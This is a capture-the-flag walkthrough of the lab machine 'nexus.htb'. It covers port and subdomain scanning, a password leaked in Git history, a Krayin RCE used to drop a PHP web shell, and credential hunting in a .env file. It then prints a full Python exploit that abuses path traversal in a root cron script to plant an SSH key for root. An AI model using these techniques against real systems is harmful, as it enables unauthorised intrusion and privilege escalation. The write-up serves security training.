# nexus.htb

> **OS:** Linux
>
> **Difficulty:** Easy
>
> **IP:** `10.10.x.x`
>
> **Date:** 03-07-2026

***

### TL;DR <a href="#tl-dr" id="tl-dr"></a>

Enumerate `nexus.htb` and its subdomains to find a public Git repository and a Krayin billing application. An earlier Git commit exposes a password. Use it with `j.matthew@nexus.htb` to access Krayin.

Exploit Krayin's remote code execution vulnerability to gain a shell as `www-data`. Filesystem enumeration reveals credentials for `jones`, which provide SSH access.

The root-owned `template-sync.py` script runs every minute. Create a malicious repository to exploit its template-synchronization flaw and add an SSH key for `root`.

**Chain:**

`Domain enum` > `subdomain enum` > `git repo password` + `krayin billing app` > `login as j.matthew` > `krayin RCE` > `shell as www-data` > `cred hunt on filesystem` > `SSH as jones` > `find root cronjob template-sync.py` > `exploit via malicious repo to add root SSH key` > `root`​

***

### Box Info <a href="#box-info" id="box-info"></a>

| **Name**       | nexus.htb                                               |
| -------------- | ------------------------------------------------------- |
| **OS**         | Linux                                                   |
| **Difficulty** | Easy                                                    |
| **Release**    | Released on 23th June, 2026                             |
| **Key skills** | subdomain enum, git, CVE, cred hunt, abuse cron job git |

***

### 1. Recon <a href="#id-1.-recon" id="id-1.-recon"></a>

Update `/etc/hosts` file with the following line:

```
10.129.40.34 nexus nexus.htb
```

**1.1 Port scan**

When enumerating the host nexus.htb, we find that port 22 and port 80 is opened

```bash
# Nmap 7.99 scan initiated Sat Jul 11 10:04:48 2026 as: /usr/lib/nmap/nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /opt/_NOTES/results/nexus/nexus.htb/scans/_full_tcp_nmap.txt -oX /opt/_NOTES/results/nexus/nexus.htb/scans/xml/_full_tcp_nmap.xml nexus.htb
Scanned at 2026-07-11 10:04:48 CEST for 1123s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Nexus Energy Authority \xE2\x80\x94 Powering the Nation's Future
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=7/11%OT=22%CT=1%CU=42871%PV=Y%DS=2%DC=T%G=Y%TM=6A51FD8
OS:3%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OP
OS:S(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST
OS:11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 3.440 days (since Tue Jul  7 23:49:35 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   148.61 ms 10.10.14.1
2   148.74 ms nexus (10.129.34.219)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 11 10:23:31 2026 -- 1 IP address (1 host up) scanned in 1123.39 seconds

```

**1.2 Initial observations**

* Hostname : nexus.htb
* Added to `/etc/hosts`:10.10.x.x

**1.3 tool-x output**

Port 80 served a static website, in which the only interesting point, was the e-mail address: `j.matthew@nexus.htb` - for now I only note this e-mail and don't do anything else.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 13.34.15.png" alt=""><figcaption></figcaption></figure>

DirBuster found no additional content. I then used `ffuf` to enumerate subdomains, which returned the following results:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fs 154
```

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 13.27.06.png" alt=""><figcaption></figcaption></figure>

The scan identified two additional subdomains: **git** and **billing**. I then updated `/etc/hosts` with the following entry:

```
10.129.40.34 nexus nexus.htb billing.nexus.htb git.nexus.htb
```

`http://git.nexus.htb` hosts a Gitea instance with one public repository.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 13.33.10.png" alt=""><figcaption></figcaption></figure>

`http://billing.nexus.htb` hosts a Krayin instance.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 13.32.42.png" alt=""><figcaption></figcaption></figure>

### 2. Foothold / Initial Access <a href="#id-2.-foothold-initial-access" id="id-2.-foothold-initial-access"></a>

**2.1 Description**

> Clone the public Git repository and inspect an earlier commit. The commit exposes a password that remains in the repository history. Use it with `j.matthew`'s email address to access Krayin (billing.nexus.htb). Its version is vulnerable to remote code execution, which provides a shell as `www-data`. Further filesystem enumeration reveals credentials for the `jones` user.

**2.2 Exploitation**

We first clone the open git repository with the following command:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup
```

Change into the cloned directory and inspect the previous commits. One commit exposes the password `N27xh!!2ucY04`.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 13.42.27.png" alt=""><figcaption></figcaption></figure>

Use this to login on the krayin webapplication (`http://billing.nexus.htb`), with the combination:

```bash
# credentials krayin webapp
j.matthew@nexus.htb:N27xh!!2ucY04
```

After signing in as `j.matthew`, open the profile menu in the upper-right corner. It confirms that Krayin runs version `2.2.0`.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 13.46.30.png" alt=""><figcaption></figcaption></figure>

Exploit-DB provides a remote-code-execution exploit for this Krayin version. Use it to generate and upload a web shell, then gain a shell as `www-data`.

{% embed url="https://www.exploit-db.com/exploits/52629" %}

We then use the exploit to first login, and then upload the php webshell. Once we reach the endpoint that was written out in our terminal, we gain a shell as the user www-data.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 14.01.19.png" alt=""><figcaption></figcaption></figure>

[http://billing.nexus.htb/storage/tinymce/013e8ad2763c0888e32447b86bbfceb4.php?cmd=id](http://billing.nexus.htb/storage/tinymce/013e8ad2763c0888e32447b86bbfceb4.php?cmd=id)

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 14.10.10.png" alt=""><figcaption></figcaption></figure>

After some research, we find a .env file with another password within the krayin folder `/var/www/krayin` and abuse this in order to login as the user `jones` :

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 14.16.15.png" alt=""><figcaption></figcaption></figure>

We can then login to the app with the combination: `jones:y27xb3ha!!74GbR`

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-18 om 14.18.18.png" alt=""><figcaption></figcaption></figure>

***

### 3. Privilege Escalation <a href="#id-3.-privilege-escalation" id="id-3.-privilege-escalation"></a>

**3.1 Description**

> To escalate from `jones` to `root`, enumerate the systemd timers. The `gitea-template-sync.timer` runs a root-owned service every minute. The service executes the readable `template-sync.py` script. The script writes template repository paths without blocking directory traversal. Create a malicious template repository to write an SSH public key to `/root/.ssh/authorized_keys`, then log in as `root`.

As `jones`, list the timers with `systemctl list-timers`. Note the `gitea-template-sync.timer` entry.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-30 om 14.42.43.png" alt=""><figcaption></figcaption></figure>

Display the service file with:

```bash
cat /etc/systemd/system/gitea-template-sync.service
```

The contents of the service file is as follows:

```
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

We found the reference in the service file to the `template-sync.py` file. The file resides in `/etc/gitea/`. Its contents are:

```python
# FILE: template-sync.py
import os
import sys
import json
import subprocess
import time
import urllib.request

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = "[%s] %s" % (ts, msg)
    print(line, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except:
        pass

def load_config():
    config = {}
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        k, v = line.split('=', 1)
                        config[k.strip()] = v.strip()
        except:
            pass
    return config

def get_token():
    cfg = load_config()
    return cfg.get('GITEA_API_TOKEN')

def get_template_repos(token):
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
    req = urllib.request.Request(url, headers={
        'Authorization': 'token %s' % token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log("API error: %s" % e)
        return []

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log("  repo not found: %s" % bare_path)
        return

    # Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return

    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return

    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            GIT = ['git', '-c', 'safe.directory=*']
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True, timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            if mode == '100755':
                os.chmod(target, 0o755)
            else:
                os.chmod(target, 0o644)

            log("  synced: %s" % filepath)
        except Exception as e:
            log("  error syncing %s: %s" % (filepath, e))

def main():
    log("Template sync starting")

    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    templates = get_template_repos(token)
    log("Found %d template repo(s)" % len(templates))

    for repo in templates:
        name = repo['full_name']
        log("Syncing template: %s" % name)
        sync_template(repo)

    log("Template sync complete")

if __name__ == '__main__':
    main()

```

> **So what is going wrong in this file?**\
> \
> There is a vulnerability in the code at the sync\_template function. Put simply, it is copying out the files in all template repos, into a directory. In copying, it follows the exact directory and subdirectory structure of the template repo. Nothing wrong, but what if we can create a template repo that looks like this:
>
> ```
> Indigo
>   ├── README.md  -> blob "# Template\n"
>   └── .. 
>       └── ..
>           └── ..
>               └── ..
>                   └── root
>                       └── .ssh
>                           └── authorized_keys
> ```

> When the python code sees the repo, it will read '..' as moving up a directory, instead of creating a directory named ".." within the indigo repo. So what the code ends up doing, is writing an SSH key to the root folder

Firstly, I sign in with Jones credentials on git.nexus.htb. I create a new repo — let’s call it indigo. I leave everything else blank, but check the “Make repository a template” box.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*xUyWNmCMxt8B94pYN0ifPg.png" alt="" height="265" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:353/1*Wn1MRIm_K7waeNmYsSDyAw.png" alt="" height="98" width="353"><figcaption></figcaption></figure>

* In my ssh shell, I typed in the following commands to create a new key pair, and cloned the repo I had created.

```bash
## Go to /tmp folder and generate a ssh key pair (public and private key)
$ cd /tmp
$ ssh-keygen -f ./mykey -N ''

## Clone the repo
$ git clone http://jones:'<password>'@localhost:3000/jones/indigo.git
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*tnwikpa4ecKoA4Svi8cCVw.png" alt="" height="590" width="700"><figcaption></figcaption></figure>

Now I copied the following exploit.py to my Kali machine, and transfer it to the target (using a python -m http.server and wget). (Disclaimer: I did not write this code - I got this from [here](https://medium.com/@shammasqazi18/htb-nexus-write-up-cccd4354da05). But I will explain what it does in the next section.)

> Write an ssh key in git exploit

```bash
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat","/tmp/mykey.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -f /tmp/mykey -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"

blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

In the ssh shell, I executed the python exploit.

```bash
$ cd indigo
$ python3 exploit.py
$ git push -u origin main --force
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*VRyRXG147kYzDWEEItx3Vg.png" alt="" height="202" width="700"><figcaption></figcaption></figure>

In my web browser, I can see an interesting directory being created

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*lUrtYGsT3_YQVekY5jarag.png" alt="" height="241" width="700"><figcaption></figcaption></figure>

I copied out the SSH private key to my own Kali machine, chmod to 600, and then used it to ssh as root. With that, I got the root flag.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*P7IzvE9Haa9iniZF1IpbYw.png" alt="" height="462" width="700"><figcaption></figcaption></figure>
